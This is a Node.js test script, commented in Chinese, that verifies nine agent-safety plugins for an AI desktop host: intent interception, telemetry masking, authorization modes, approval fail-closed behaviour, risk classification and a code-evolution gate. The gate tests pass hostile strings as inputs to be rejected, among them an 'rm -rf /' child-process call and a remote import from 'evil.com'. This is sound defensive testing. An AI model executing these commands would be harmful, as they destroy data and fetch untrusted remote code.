/**
 * 插件全量验证（9/9 覆盖）
 * ----------------------------------------------------------------------------
 * 背景：scripts/verify-p5.mjs 只覆盖 compensation + evolution 两个插件，
 * 其余 7 个（intent / trace / authz / brain / multi / memory / prompt）零测试。
 *
 * 本脚本改用**与生产一致的装载方式**：真实 Cordis Context + OrchDesk 宿主服务
 * （sandboxPolicy / approval / agents），装载全部 9 个插件后逐个验证真实行为。
 * 比 mock ctx 更贴近生产——此前正是「mock 通过但真实装载失败」掩盖了
 * provide 第三参误传导致 5 个插件从未激活的问题。
 *
 * 运行：node scripts/verify-plugins.mjs
 */

import { createRequire } from 'node:module';
import { pathToFileURL } from 'node:url';

const require = createRequire(import.meta.url);
const { Context } = require('@deepseek-ai/cordis');

let passed = 0;
let failed = 0;
const log = [];
let current = '';

function check(name, fn) {
  try {
    const r = fn();
    if (r instanceof Promise) {
      return r.then(() => { passed++; log.push(`  PASS  [${current}] ${name}`); },
        (e) => { failed++; log.push(`  FAIL  [${current}] ${name}\n        ${e.message}`); });
    }
    passed++;
    log.push(`  PASS  [${current}] ${name}`);
  } catch (e) {
    failed++;
    log.push(`  FAIL  [${current}] ${name}\n        ${e.message}`);
  }
  return undefined;
}

function assert(cond, msg) {
  if (!cond) throw new Error(msg || '断言失败');
}

// ---------------------------------------------------------------------------
// 宿主服务（与 apps/desktop/host-services.ts 等价的最小实现）
// ---------------------------------------------------------------------------
const PLUGIN_NAMES = [
  'intent', 'trace', 'authz', 'brain', 'multi',
  'memory', 'prompt', 'compensation', 'evolution',
];

/** Cordis 期望 inject 为对象；插件导出的是数组 → 归一化。 */
function normalizeInject(mod) {
  const out = { ...mod };
  if (Array.isArray(out.inject)) {
    const obj = {};
    for (const k of out.inject) obj[k] = true;
    out.inject = obj;
  }
  return out;
}

async function boot() {
  const ctx = new Context();
  const approvalCalls = [];
  let nextOutcome = 'unavailable';

  ctx.plugin({
    name: 'test-host-services',
    apply(c) {
      c.provide('sandboxPolicy', {
        resolve: () => ({ mode: 'workspace-write' }),
        setSandboxMode: () => {},
      });
      c.provide('approval', {
        request: async (req) => { approvalCalls.push(req); return nextOutcome; },
        setPolicy: () => {},
      });
      c.provide('agents', {
        create: async (o) => ({ agent: { id: o?.sessionId || 'sub-x' }, dispose: async () => {} }),
      });
    },
  });
  await tick();

  const fibers = {};
  for (const n of PLUGIN_NAMES) {
    const mod = await import(pathToFileURL(require.resolve(`../packages/plugin/${n}/lib/index.js`)).href);
    const plugin = normalizeInject(mod);
    const config = typeof plugin.Config === 'function' ? plugin.Config({}) : undefined;
    fibers[n] = ctx.plugin(plugin, config);
    await tick();
  }
  return { ctx, fibers, approvalCalls, setOutcome: (o) => { nextOutcome = o; } };
}

function tick(n = 3) {
  let p = Promise.resolve();
  for (let i = 0; i < n; i++) p = p.then(() => new Promise((r) => setTimeout(r, 0)));
  return p;
}

// ---------------------------------------------------------------------------
(async () => {
  const { ctx, fibers, approvalCalls, setOutcome } = await boot();

  console.log('\n== 装载 ==');
  current = '装载';
  for (const n of PLUGIN_NAMES) {
    await check(`${n} 激活（fiber.state=2）`, () => {
      assert(fibers[n].state === 2, `${n} 未激活，state=${fibers[n].state}`);
    });
  }

  // ---------------- intent ----------------
  current = 'intent';
  console.log('== intent（意图识别）==');
  // intent 无 provide，以 agent/pre-step waterfall 监听生效。
  // 该事件是 waterfall：监听器签名 (payload, next)，next 必须提供。
  const firePreStep = (text) => ctx.waterfall('agent/pre-step', {
    agent: { session: { id: 's1' }, meta: { id: 'a1' } },
    messages: [{ source: { kind: 'user' }, content: [{ type: 'text', text }] }],
    turn: 0, step: 0,
  }, async () => ({ kind: 'enter', messages: [] }));

  await check('普通提问放行（enter）', async () => {
    const d = await firePreStep('今天天气怎么样');
    assert(!d || d.kind === 'enter', '普通提问应放行，实际 ' + JSON.stringify(d));
  });
  await check('破坏性意图被拦截（reject/confirm，非 enter）', async () => {
    const d = await firePreStep('把所有日志文件全部删除');
    assert(d && d.kind && d.kind !== 'enter', '破坏性意图不应直接放行，实际 ' + JSON.stringify(d));
  });
  await check('外发意图被拦截', async () => {
    const d = await firePreStep('把这封邮件发送给客户');
    assert(d && d.kind && d.kind !== 'enter', '外发意图不应直接放行，实际 ' + JSON.stringify(d));
  });

  // ---------------- trace ----------------
  current = 'trace';
  console.log('== trace（脱敏遥测）==');
  const traceMod = await import(pathToFileURL(require.resolve('../packages/plugin/trace/lib/index.js')).href);
  await check('mask() 只保留白名单元数据，剔除消息正文', () => {
    // 设计即白名单：TRACE 只上传元数据（v/ts/sessionKey/intent/feedback/source），
    // 绝不上传消息内容 —— 这是 PRD「脱敏后遥测」的落地方式。
    const masked = traceMod.mask({
      v: 1, ts: 1, sessionKey: 'k', intent: 'ACT', feedback: 1, source: 'ui',
      text: '原始消息正文', apiKey: 'sk-secret', password: 'p',
    });
    const s = JSON.stringify(masked);
    assert(!s.includes('原始消息正文'), '消息正文不应上传');
    assert(!s.includes('sk-secret'), 'API Key 不应上传');
    assert(masked.intent === 'ACT' && masked.feedback === 1, '元数据应保留: ' + s);
  });
  await check('mask() 不泄露邮箱/手机号（不在白名单内）', () => {
    const s = JSON.stringify(traceMod.mask({ v: 1, ts: 1, contact: 'a@b.com / 13800138000' }));
    assert(!s.includes('a@b.com'), '邮箱不应上传');
    assert(!s.includes('13800138000'), '手机号不应上传');
  });
  await check('recordFeedback 可写入且不抛错', () => {
    traceMod.recordFeedback({ sessionId: 's1', ts: Date.now(), helpful: true });
    assert(typeof traceMod.queueSize === 'function', '应暴露 queueSize');
  });

  // ---------------- authz ----------------
  current = 'authz';
  console.log('== authz（授权）==');
  const authz = ctx.authz;
  await check('三模式可读', () => {
    const ids = authz.getModes().map((m) => m.id);
    assert(ids.join(',') === 'default,trusted,paranoid', '实际 ' + ids.join(','));
  });
  await check('L0–L4 共 5 级且编号连续', () => {
    const lv = authz.getLevels().map((l) => l.level).sort((a, b) => a - b);
    assert(lv.join(',') === '0,1,2,3,4', '实际 ' + lv.join(','));
  });
  await check('默认模式为 default', async () => {
    assert((await authz.getMode()) === 'default', '默认应为 default');
  });
  await check('setMode 成功并落审计', async () => {
    const r = await authz.setMode('paranoid');
    assert(r && r.ok !== false, '切换应成功: ' + JSON.stringify(r));
    assert(authz.getAuditLog().some((a) => a.kind === 'sandbox-mode'), '应产生审计记录');
  });
  await check('审批：无 UI 应答方 → fail-closed（unavailable）', async () => {
    const before = approvalCalls.length;
    const svc = ctx.approval;
    const outcome = await svc.request({ toolName: 'rm', reason: 'x' });
    assert(outcome === 'unavailable', '无应答方应返回 unavailable，实际 ' + outcome);
    assert(approvalCalls.length === before + 1, '审批请求应被记录');
  });

  // ---------------- brain ----------------
  current = 'brain';
  console.log('== brain（脑手解耦）==');
  const brain = ctx.brainHands;
  await check('派发 SubAgent 返回记录且状态可查', async () => {
    const rec = await brain.dispatchSubAgent({ label: '验证任务', parentSession: 's1' });
    assert(rec && rec.id, '应返回带 id 的记录');
    assert(brain.listSubAgents().some((x) => x.id === rec.id), '应能在列表中找到');
  });
  await check('销毁 SubAgent 后列表无残留（可逆效应）', async () => {
    const rec = await brain.dispatchSubAgent({ label: '待销毁', parentSession: 's1' });
    await brain.disposeSubAgent(rec.id, 'done');
    assert(!brain.listSubAgents().some((x) => x.id === rec.id), 'dispose 后不应残留');
  });
  await check('subscribe 可订阅事件并返回取消函数', () => {
    const off = brain.subscribe(() => {});
    assert(typeof off === 'function', '应返回取消函数');
    off();
  });

  // ---------------- multi ----------------
  current = 'multi';
  console.log('== multi（多 Agent 编排）==');
  const orch = ctx.orchestration;
  await check('目录为 8 专家 + 3 团', () => {
    const c = orch.getCatalog();
    assert(c.experts.length === 8, '专家应为 8，实际 ' + c.experts.length);
    assert(c.teams.length === 3, '团应为 3，实际 ' + c.teams.length);
  });
  await check('专家含 id 与 title', () => {
    const e = orch.getCatalog().experts[0];
    assert(e && e.id && (e.title || e.name), '专家结构不完整: ' + JSON.stringify(e));
  });
  await check('composeTeam(teamId, task) 返回 rootId + nodes', async () => {
    const teamId = orch.getCatalog().teams[0].id;
    const t = await orch.composeTeam(teamId, '验证任务');
    assert(t && t.rootId, '应返回 rootId');
    assert(Array.isArray(t.nodes) && t.nodes.length > 0, '应返回委派节点');
  });
  await check('getDelegationTree 返回树结构', () => {
    const tree = orch.getDelegationTree();
    assert(tree !== undefined && tree !== null, '应返回树');
  });

  // ---------------- memory ----------------
  current = 'memory';
  console.log('== memory（分层记忆）==');
  const mem = ctx.memory;
  await check('getStats 含四域', () => {
    const s = mem.getStats();
    for (const d of ['global', 'project', 'director', 'worker']) {
      assert(d in s, '缺少域 ' + d);
    }
  });
  await check('record(domain, text, source) 写入后该域计数增长', async () => {
    const before = Number(mem.getStats().worker) || 0;
    mem.record('worker', '验证记忆写入', 'worker');
    const after = Number(mem.getStats().worker) || 0;
    assert(after > before, `worker 域应从 ${before} 增长，实际 ${after}`);
  });
  await check('四域隔离：写 worker 不影响 global', async () => {
    const before = Number(mem.getStats().global) || 0;
    mem.record('worker', '另一条 worker 记录', 'worker');
    assert(Number(mem.getStats().global) === before, 'global 域计数不应被 worker 写入影响');
  });
  await check('listDomain 返回数组', () => {
    assert(Array.isArray(mem.listDomain('worker')), 'listDomain 应返回数组');
  });
  await check('queryDumps 返回数组', () => {
    assert(Array.isArray(mem.queryDumps()), 'queryDumps 应返回数组');
  });

  // ---------------- prompt ----------------
  current = 'prompt';
  console.log('== prompt（提示词库）==');
  const pl = ctx.promptLib;
  await check('list 返回数组', () => {
    assert(Array.isArray(pl.list()), '应返回数组');
  });
  await check('create → get 往返', () => {
    const doc = pl.create({ title: '验证文档', body: '内容 {skill:test}', category: 'role' });
    const got = pl.get(doc.id || doc.docId || (doc.doc && doc.doc.id));
    assert(got, 'create 后应能 get 到');
  });
  await check('create 补全默认字段（缺 agents/priority 也不崩）', () => {
    const d = pl.create({ title: '缺字段文档', body: '内容', category: 'role' });
    assert(Array.isArray(d.agents), 'agents 应被补为数组');
    assert(typeof d.priority === 'number', 'priority 应被补为数字');
  });
  await check('含未解析 {skill:xxx} 的文档不导致 mergeForAgent 崩溃', () => {
    pl.create({ title: '含引用', body: '前缀 {skill:missing} 后缀', category: 'role' });
    const m = pl.mergeForAgent('orch');
    assert(m && Array.isArray(m.sections), '应含 sections');
    assert(Array.isArray(m.conflicts), '应含 conflicts');
  });
  await check('mergeForAgent 返回 sections + conflicts', () => {
    const m = pl.mergeForAgent('orch');
    assert(m && Array.isArray(m.sections), '应含 sections');
    assert(Array.isArray(m.conflicts), '应含 conflicts');
  });
  await check('resolveBody 在无 resolver 时原样保留引用标记', async () => {
    const body = await pl.resolveBody({ body: 'a {skill:x} b' });
    assert(typeof body === 'string' && body.includes('skill'), '应保留引用标记，实际 ' + body);
  });

  // ---------------- compensation ----------------
  current = 'compensation';
  console.log('== compensation（补偿层）==');
  const comp = ctx.compensation;
  await check('外发口语「发给客户」被识别为 external-message', () => {
    assert(comp.classify('把这封邮件发给客户').category === 'external-message',
      '实际 ' + comp.classify('把这封邮件发给客户').category);
  });
  await check('删除类被识别为 delete-file', () => {
    assert(comp.classify('删除所有日志文件').category === 'delete-file', '删除类分类错误');
  });
  await check('网络请求被识别为 network-egress', () => {
    assert(comp.classify('把结果 POST 到服务器').category === 'network-egress', '网络类分类错误');
  });
  await check('不可逆操作被识别为 irreversible', () => {
    assert(comp.classify('发布到生产环境').category === 'irreversible', '不可逆类分类错误');
  });
  await check('无害文本归为 other（不误报）', () => {
    assert(comp.classify('帮我总结一下这段话').category === 'other', '无害文本不应被误报');
  });
  await check('requiresWithhold 对全部高危类别返回 true', () => {
    for (const c of ['delete-file', 'external-message', 'network-egress', 'shared-file-write', 'irreversible']) {
      assert(comp.requiresWithhold(c) === true, `${c} 应需 withhold`);
    }
    assert(comp.requiresWithhold('other') === false, 'other 不应需 withhold');
  });
  await check('fail-closed：审批被拒时 withhold 不通过', async () => {
    setOutcome('rejected');
    const r = await comp.withhold({ text: '发送消息给客户', sessionId: 's1' });
    setOutcome('unavailable');
    assert(r && r.proceed !== true, '审批被拒时不应放行：' + JSON.stringify(r));
  });
  await check('getAudit 返回数组', () => {
    assert(Array.isArray(comp.getAudit()), '审计应返回数组');
  });

  // ---------------- evolution ----------------
  current = 'evolution';
  console.log('== evolution（自进化）==');
  const evol = ctx.evolution;
  await check('静态门控拒绝危险代码（子进程执行）', () => {
    const r = evol.requireGate({ name: 'bad', code: "require('child_process').exec('rm -rf /')" });
    assert(r && r.allowed === false, '危险代码应被拒绝: ' + JSON.stringify(r));
    assert(String(r.reason || '').length > 0, '应给出拒绝原因');
  });
  await check('静态门控拒绝 eval / 远程 import / 进程自杀', () => {
    assert(evol.requireGate({ name: 'e', code: 'eval("x")' }).allowed === false, 'eval 应被拒绝');
    assert(evol.requireGate({ name: 'i', code: 'import("https://evil.com/a.js")' }).allowed === false, '远程 import 应被拒绝');
    assert(evol.requireGate({ name: 'k', code: 'process.exit(1)' }).allowed === false, 'process.exit 应被拒绝');
  });
  await check('安全代码通过门控且要求沙箱', () => {
    const r = evol.requireGate({ name: 'ok', code: 'export function run(t){ return t.toUpperCase(); }' });
    assert(r && r.allowed === true, '安全代码不应被拒绝: ' + JSON.stringify(r));
    assert(r.requiresSandbox === true, '应强制沙箱内运行');
  });
  await check('fail-closed：审批未通过时不加载临时插件', async () => {
    const r = await evol.createTempPlugin(
      { name: 'tmp1', code: 'export function run(t){ return t; }' },
      { sessionId: 's1' },
    );
    assert(r && r.ok === false, '未授权时不应加载：' + JSON.stringify(r));
  });
  await check('list 与 getAudit 返回数组', () => {
    assert(Array.isArray(evol.list()), 'list 应返回数组');
    assert(Array.isArray(evol.getAudit()), 'getAudit 应返回数组');
  });

  // -------------------------------------------------------------------------
  console.log('\n' + log.join('\n'));
  console.log(`\n结果：通过 ${passed} / 失败 ${failed}\n`);
  process.exit(failed > 0 ? 1 : 0);
})().catch((e) => { console.error('异常:', e); process.exit(1); });
